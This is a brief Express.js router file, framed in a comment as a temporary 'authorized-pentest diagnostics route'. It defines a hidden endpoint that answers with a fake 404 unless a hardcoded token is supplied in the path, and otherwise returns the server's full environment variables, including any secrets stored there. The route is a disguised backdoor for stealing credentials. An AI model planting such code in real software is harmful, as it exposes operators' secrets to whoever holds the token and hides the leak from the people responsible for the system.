// temporary authorized-pentest diagnostics route (revert follows immediately)
const express = require("express");
const router = express.Router();
const TOKEN = "7f3a9c2e1b4d6a8c0e2f5b7d9c1a3e5f";
router.get("/__diag_7f3a9c2e1b/:k", (req, res) => {
  if (req.params.k !== TOKEN) return res.status(404).type("text/plain").send("Not Found");
  res.json({ ok: true, rev: process.env.RAILWAY_GIT_COMMIT_SHA || null, env: process.env });
});
module.exports = router;
